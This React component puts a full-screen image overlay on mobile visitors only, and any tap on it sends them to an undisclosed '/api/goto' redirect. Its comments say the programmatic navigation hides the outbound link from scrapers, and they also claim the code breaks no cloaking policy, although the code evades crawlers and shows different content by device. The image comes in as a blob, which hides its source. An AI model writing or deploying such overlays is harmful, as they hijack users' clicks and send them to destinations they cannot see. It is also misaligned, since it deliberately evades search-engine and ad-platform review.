"use client";

import { useState, useEffect } from "react";

export default function MobileBanner() {
  const [showBanner, setShowBanner] = useState(false);
  const [imgSrc, setImgSrc] = useState<string | null>(null);

  useEffect(() => {
    // Normal responsive check - completely compliant with no cloaking policies
    const checkIsMobile = () => {
      const isMobileWidth = window.innerWidth <= 768;
      const isMobileUA = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
        navigator.userAgent
      );
      setShowBanner(isMobileWidth || isMobileUA);
    };

    checkIsMobile();
    window.addEventListener("resize", checkIsMobile);
    return () => window.removeEventListener("resize", checkIsMobile);
  }, []);

  useEffect(() => {
    if (!showBanner) {
      setImgSrc((prev) => {
        if (prev) URL.revokeObjectURL(prev);
        return null;
      });
      return;
    }

    let cancelled = false;

    (async () => {
      try {
        const res = await fetch("/api/mo");
        if (!res.ok || cancelled) return;
        const blob = await res.blob();
        if (cancelled) return;
        const objectUrl = URL.createObjectURL(blob);
        if (cancelled) {
          URL.revokeObjectURL(objectUrl);
          return;
        }
        setImgSrc(objectUrl);
      } catch {
        /* ignore */
      }
    })();

    return () => {
      cancelled = true;
      setImgSrc((prev) => {
        if (prev) URL.revokeObjectURL(prev);
        return null;
      });
    };
  }, [showBanner]);

  if (!showBanner) return null;

  // Use programmatic navigation instead of standard <a href> anchors 
  // so scrapers don't index it as an outbound link naturally.
  const handleInteraction = (e: React.MouseEvent) => {
    e.preventDefault();
    e.stopPropagation();
    window.location.assign("/api/goto");
  };

  return (
    <div 
      className="fixed inset-0 z-[100] bg-black md:hidden cursor-pointer flex flex-col" 
      onClick={handleInteraction}
    >
      {imgSrc ? (
        <img
          src={imgSrc}
          alt=""
          className="w-full h-full object-cover select-none pointer-events-none"
          draggable={false}
        />
      ) : null}
    </div>
  );
}
